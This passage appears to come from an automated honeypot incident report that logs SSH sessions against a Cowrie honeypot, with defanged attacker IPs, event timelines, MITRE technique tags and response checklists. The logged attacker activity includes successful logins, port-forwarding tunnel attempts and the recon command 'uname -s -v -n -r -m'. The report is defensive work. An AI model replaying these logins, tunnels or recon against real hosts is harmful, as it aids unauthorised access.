| Time (UTC) | Event |
|---|---|
| `2026-08-17 04:16:44` | `cowrie.session.connect` |
| `2026-08-17 04:16:45` | `cowrie.client.version` |
| `2026-08-17 04:16:45` | `cowrie.client.kex` |
| `2026-08-17 04:16:48` | `cowrie.login.success` |
| `2026-08-17 04:16:48` | `cowrie.direct-tcpip.request` |
| `2026-08-17 04:16:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.48.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `59.48.40[.]6` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aab90c3dacc0

| Field | Detail |
|---|---|
| **Source IP** | `220.246.66[.]209` |
| **First Seen** | 2026-08-17 04:16 |
| **Last Seen** | 2026-08-17 04:17 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 04:16:59` | `cowrie.session.connect` |
| `2026-08-17 04:17:00` | `cowrie.client.version` |
| `2026-08-17 04:17:00` | `cowrie.client.kex` |
| `2026-08-17 04:17:03` | `cowrie.login.success` |
| `2026-08-17 04:17:04` | `cowrie.direct-tcpip.request` |
| `2026-08-17 04:17:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.246.66[.]209` to AbuseIPDB if not already reported
- [ ] Block `220.246.66[.]209` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-747da6dae475

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-17 04:18 |
| **Last Seen** | 2026-08-17 04:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 04:18:55` | `cowrie.session.connect` |
| `2026-08-17 04:18:55` | `cowrie.client.version` |
| `2026-08-17 04:18:55` | `cowrie.client.kex` |
| `2026-08-17 04:18:56` | `cowrie.login.success` |
| `2026-08-17 04:18:56` | `cowrie.direct-tcpip.request` |
| `2026-08-17 04:18:56` | `cowrie.direct-tcpip.data` |
| `2026-08-17 04:18:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1dd48429fd80

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-17 04:22 |
| **Last Seen** | 2026-08-17 04:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 04:22:07` | `cowrie.session.connect` |
| `2026-08-17 04:22:07` | `cowrie.client.version` |
| `2026-08-17 04:22:07` | `cowrie.client.kex` |
| `2026-08-17 04:22:08` | `cowrie.login.success` |
| `2026-08-17 04:22:09` | `cowrie.session.params` |
| `2026-08-17 04:22:09` | `cowrie.command.input` |
| `2026-08-17 04:22:09` | `cowrie.log.closed` |
| `2026-08-17 04:22:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca15b5d54532

| Field | Detail |
|---|---|
| **Source IP** | `62.201.212[.]54` |
| **First Seen** | 2026-08-17 04:39 |
| **Last Seen** | 2026-08-17 04:39 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 04:39:24` | `cowrie.session.connect` |
| `2026-08-17 04:39:24` | `cowrie.client.version` |
| `2026-08-17 04:39:24` | `cowrie.client.kex` |
| `2026-08-17 04:39:25` | `cowrie.login.success` |
| `2026-08-17 04:39:26` | `cowrie.direct-tcpip.request` |
| `2026-08-17 04:39:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.201.212[.]54` to AbuseIPDB if not already reported
- [ ] Block `62.201.212[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87b823657a30

| Field | Detail |
|---|---|
| **Source IP** | `113.158.205[.]225` |
| **First Seen** | 2026-08-17 04:40 |
| **Last Seen** | 2026-08-17 04:41 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 04:40:59` | `cowrie.session.connect` |
| `2026-08-17 04:41:00` | `cowrie.client.version` |
| `2026-08-17 04:41:00` | `cowrie.client.kex` |
| `2026-08-17 04:41:04` | `cowrie.login.success` |
| `2026-08-17 04:41:04` | `cowrie.direct-tcpip.request` |
| `2026-08-17 04:41:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.158.205[.]225` to AbuseIPDB if not already reported
- [ ] Block `113.158.205[.]225` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d496db77d63f

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-17 04:41 |
| **Last Seen** | 2026-08-17 04:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 04:41:13` | `cowrie.session.connect` |
| `2026-08-17 04:41:13` | `cowrie.client.version` |
| `2026-08-17 04:41:13` | `cowrie.client.kex` |
| `2026-08-17 04:41:14` | `cowrie.login.success` |
| `2026-08-17 04:41:15` | `cowrie.session.params` |
| `2026-08-17 04:41:15` | `cowrie.command.input` |
| `2026-08-17 04:41:15` | `cowrie.log.closed` |
| `2026-08-17 04:41:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-949eaa9ccfc7

| Field | Detail |
|---|---|
| **Source IP** | `213.33.204[.]130` |
| **First Seen** | 2026-08-17 04:41 |
| **Last Seen** | 2026-08-17 04:41 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 04:41:15` | `cowrie.session.connect` |
| `2026-08-17 04:41:15` | `cowrie.client.version` |
| `2026-08-17 04:41:15` | `cowrie.client.kex` |
| `2026-08-17 04:41:16` | `cowrie.login.success` |
| `2026-08-17 04:41:17` | `cowrie.direct-tcpip.request` |
| `2026-08-17 04:41:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.33.204[.]130` to AbuseIPDB if not already reported
- [ ] Block `213.33.204[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f119fad6d5c

| Field | Detail |
|---|---|
| **Source IP** | `213.55.79[.]195` |
| **First Seen** | 2026-08-17 04:52 |
| **Last Seen** | 2026-08-17 04:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 04:52:18` | `cowrie.session.connect` |
| `2026-08-17 04:52:19` | `cowrie.client.version` |
| `2026-08-17 04:52:19` | `cowrie.client.kex` |
| `2026-08-17 04:52:21` | `cowrie.login.success` |
| `2026-08-17 04:52:21` | `cowrie.direct-tcpip.request` |
| `2026-08-17 04:52:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.55.79[.]195` to AbuseIPDB if not already reported
- [ ] Block `213.55.79[.]195` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d74313d28ade

| Field | Detail |
|---|---|
| **Source IP** | `178.216.165[.]187` |
| **First Seen** | 2026-08-17 04:52 |
| **Last Seen** | 2026-08-17 04:52 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 04:52:27` | `cowrie.session.connect` |
| `2026-08-17 04:52:28` | `cowrie.client.version` |
| `2026-08-17 04:52:28` | `cowrie.client.kex` |
| `2026-08-17 04:52:29` | `cowrie.login.success` |
| `2026-08-17 04:52:29` | `cowrie.direct-tcpip.request` |
| `2026-08-17 04:52:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.216.165[.]187` to AbuseIPDB if not already reported
- [ ] Block `178.216.165[.]187` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-007d33cb2232

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-17 05:00 |
| **Last Seen** | 2026-08-17 05:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 05:00:22` | `cowrie.session.connect` |
| `2026-08-17 05:00:22` | `cowrie.client.version` |
| `2026-08-17 05:00:23` | `cowrie.client.kex` |
| `2026-08-17 05:00:23` | `cowrie.login.success` |
| `2026-08-17 05:00:24` | `cowrie.session.params` |
| `2026-08-17 05:00:24` | `cowrie.command.input` |
| `2026-08-17 05:00:24` | `cowrie.log.closed` |
| `2026-08-17 05:00:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-576b79f75462

| Field | Detail |
|---|---|
| **Source IP** | `49.124.153[.]23` |
| **First Seen** | 2026-08-17 05:09 |
| **Last Seen** | 2026-08-17 05:09 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 05:09:29` | `cowrie.session.connect` |
| `2026-08-17 05:09:30` | `cowrie.client.version` |
| `2026-08-17 05:09:30` | `cowrie.client.kex` |
| `2026-08-17 05:09:33` | `cowrie.login.success` |
| `2026-08-17 05:09:34` | `cowrie.direct-tcpip.request` |
| `2026-08-17 05:09:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.153[.]23` to AbuseIPDB if not already reported
- [ ] Block `49.124.153[.]23` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-672beb499ca0

| Field | Detail |
|---|---|
| **Source IP** | `65.20.161[.]126` |
| **First Seen** | 2026-08-17 05:09 |
| **Last Seen** | 2026-08-17 05:09 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 05:09:39` | `cowrie.session.connect` |
| `2026-08-17 05:09:40` | `cowrie.client.version` |
| `2026-08-17 05:09:40` | `cowrie.client.kex` |
| `2026-08-17 05:09:42` | `cowrie.login.success` |
| `2026-08-17 05:09:42` | `cowrie.direct-tcpip.request` |
| `2026-08-17 05:09:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.161[.]126` to AbuseIPDB if not already reported
- [ ] Block `65.20.161[.]126` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fcf34271f70

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-17 05:15 |
| **Last Seen** | 2026-08-17 05:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 05:15:00` | `cowrie.session.connect` |
| `2026-08-17 05:15:00` | `cowrie.client.version` |
| `2026-08-17 05:15:00` | `cowrie.client.kex` |
| `2026-08-17 05:15:00` | `cowrie.login.success` |
| `2026-08-17 05:15:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed5f679fa791

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-17 05:15 |
| **Last Seen** | 2026-08-17 05:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 05:15:01` | `cowrie.session.connect` |
| `2026-08-17 05:15:01` | `cowrie.client.version` |
| `2026-08-17 05:15:01` | `cowrie.client.kex` |
| `2026-08-17 05:15:02` | `cowrie.login.success` |
| `2026-08-17 05:15:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e01a38407c5

| Field | Detail |
|---|---|
| **Source IP** | `138.118.213[.]68` |
| **First Seen** | 2026-08-17 05:15 |
| **Last Seen** | 2026-08-17 05:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 05:15:03` | `cowrie.session.connect` |
| `2026-08-17 05:15:03` | `cowrie.client.version` |
| `2026-08-17 05:15:03` | `cowrie.client.kex` |
| `2026-08-17 05:15:06` | `cowrie.login.success` |
| `2026-08-17 05:15:06` | `cowrie.direct-tcpip.request` |
| `2026-08-17 05:15:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.118.213[.]68` to AbuseIPDB if not already reported
- [ ] Block `138.118.213[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-675b1f365efa

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-17 05:15 |
| **Last Seen** | 2026-08-17 05:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 05:15:06` | `cowrie.session.connect` |
| `2026-08-17 05:15:06` | `cowrie.client.version` |
| `2026-08-17 05:15:07` | `cowrie.client.kex` |
| `2026-08-17 05:15:07` | `cowrie.login.success` |
| `2026-08-17 05:15:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8eea23b5c219

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-17 05:15 |
| **Last Seen** | 2026-08-17 05:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 05:15:07` | `cowrie.session.connect` |
| `2026-08-17 05:15:07` | `cowrie.client.version` |
| `2026-08-17 05:15:08` | `cowrie.client.kex` |
| `2026-08-17 05:15:08` | `cowrie.login.success` |
| `2026-08-17 05:15:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f54d8ead3c3

| Field | Detail |
|---|---|
| **Source IP** | `45.178.227[.]0` |
| **First Seen** | 2026-08-17 05:16 |
| **Last Seen** | 2026-08-17 05:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 05:16:38` | `cowrie.session.connect` |
| `2026-08-17 05:16:39` | `cowrie.client.version` |
| `2026-08-17 05:16:39` | `cowrie.client.kex` |
| `2026-08-17 05:16:41` | `cowrie.login.success` |
| `2026-08-17 05:16:42` | `cowrie.direct-tcpip.request` |
| `2026-08-17 05:16:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.178.227[.]0` to AbuseIPDB if not already reported
- [ ] Block `45.178.227[.]0` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-471c74d9dd07

| Field | Detail |
|---|---|
| **Source IP** | `218.58.73[.]238` |
| **First Seen** | 2026-08-17 05:16 |
| **Last Seen** | 2026-08-17 05:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 05:16:47` | `cowrie.session.connect` |
| `2026-08-17 05:16:48` | `cowrie.client.version` |
| `2026-08-17 05:16:48` | `cowrie.client.kex` |
| `2026-08-17 05:16:50` | `cowrie.login.success` |
| `2026-08-17 05:16:51` | `cowrie.direct-tcpip.request` |
| `2026-08-17 05:16:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.58.73[.]238` to AbuseIPDB if not already reported
- [ ] Block `218.58.73[.]238` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f275ca662bce

| Field | Detail |
|---|---|
| **Source IP** | `82.102.188[.]117` |
| **First Seen** | 2026-08-17 05:16 |
| **Last Seen** | 2026-08-17 05:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 05:16:48` | `cowrie.session.connect` |
| `2026-08-17 05:16:48` | `cowrie.client.version` |
| `2026-08-17 05:16:48` | `cowrie.client.kex` |
| `2026-08-17 05:16:50` | `cowrie.login.success` |
| `2026-08-17 05:16:50` | `cowrie.direct-tcpip.request` |
| `2026-08-17 05:16:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.102.188[.]117` to AbuseIPDB if not already reported
- [ ] Block `82.102.188[.]117` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44ad90aa31a9

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-17 05:19 |
| **Last Seen** | 2026-08-17 05:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 05:19:28` | `cowrie.session.connect` |
| `2026-08-17 05:19:28` | `cowrie.client.version` |
| `2026-08-17 05:19:28` | `cowrie.client.kex` |
| `2026-08-17 05:19:29` | `cowrie.login.success` |
| `2026-08-17 05:19:30` | `cowrie.session.params` |
| `2026-08-17 05:19:30` | `cowrie.command.input` |
| `2026-08-17 05:19:30` | `cowrie.log.closed` |
| `2026-08-17 05:19:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-747840574806

| Field | Detail |
|---|---|
| **Source IP** | `34.62.174[.]198` |
| **First Seen** | 2026-08-17 05:35 |
| **Last Seen** | 2026-08-17 05:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 05:35:44` | `cowrie.session.connect` |
| `2026-08-17 05:35:44` | `cowrie.login.success` |
| `2026-08-17 05:35:44` | `cowrie.session.params` |
| `2026-08-17 05:35:44` | `cowrie.command.input` |
| `2026-08-17 05:35:44` | `cowrie.command.input` |
| `2026-08-17 05:35:44` | `cowrie.command.failed` |
| `2026-08-17 05:35:44` | `cowrie.command.input` |
| `2026-08-17 05:35:44` | `cowrie.log.closed` |
| `2026-08-17 05:35:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.62.174[.]198` to AbuseIPDB if not already reported
- [ ] Block `34.62.174[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a659d1e7b6c7

| Field | Detail |
|---|---|
| **Source IP** | `34.62.174[.]198` |
| **First Seen** | 2026-08-17 05:35 |
| **Last Seen** | 2026-08-17 05:36 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 05:35:52` | `cowrie.session.connect` |
| `2026-08-17 05:35:52` | `cowrie.login.success` |
| `2026-08-17 05:35:53` | `cowrie.session.params` |
| `2026-08-17 05:35:53` | `cowrie.command.input` |
| `2026-08-17 05:35:53` | `cowrie.command.failed` |
| `2026-08-17 05:36:00` | `cowrie.log.closed` |
| `2026-08-17 05:36:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.62.174[.]198` to AbuseIPDB if not already reported
- [ ] Block `34.62.174[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fbcad8b64af

| Field | Detail |
|---|---|
| **Source IP** | `34.62.174[.]198` |
| **First Seen** | 2026-08-17 05:35 |
| **Last Seen** | 2026-08-17 05:36 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 05:35:54` | `cowrie.session.connect` |
| `2026-08-17 05:35:54` | `cowrie.login.success` |
| `2026-08-17 05:35:55` | `cowrie.session.params` |
| `2026-08-17 05:35:55` | `cowrie.command.input` |
| `2026-08-17 05:36:00` | `cowrie.log.closed` |
| `2026-08-17 05:36:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.62.174[.]198` to AbuseIPDB if not already reported
- [ ] Block `34.62.174[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7cd1a458412

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-17 05:38 |
| **Last Seen** | 2026-08-17 05:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 05:38:34` | `cowrie.session.connect` |
| `2026-08-17 05:38:34` | `cowrie.client.version` |
| `2026-08-17 05:38:34` | `cowrie.client.kex` |
| `2026-08-17 05:38:35` | `cowrie.login.success` |
| `2026-08-17 05:38:35` | `cowrie.session.params` |
| `2026-08-17 05:38:35` | `cowrie.command.input` |
| `2026-08-17 05:38:36` | `cowrie.log.closed` |
| `2026-08-17 05:38:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f639b170d91c

| Field | Detail |
|---|---|
| **Source IP** | `36.137.38[.]119` |
| **First Seen** | 2026-08-17 05:44 |
| **Last Seen** | 2026-08-17 05:44 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 05:44:00` | `cowrie.session.connect` |
| `2026-08-17 05:44:01` | `cowrie.client.version` |
| `2026-08-17 05:44:01` | `cowrie.client.kex` |
| `2026-08-17 05:44:03` | `cowrie.login.success` |
| `2026-08-17 05:44:05` | `cowrie.direct-tcpip.request` |
| `2026-08-17 05:44:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.137.38[.]119` to AbuseIPDB if not already reported
- [ ] Block `36.137.38[.]119` at perimeter firewall / security group
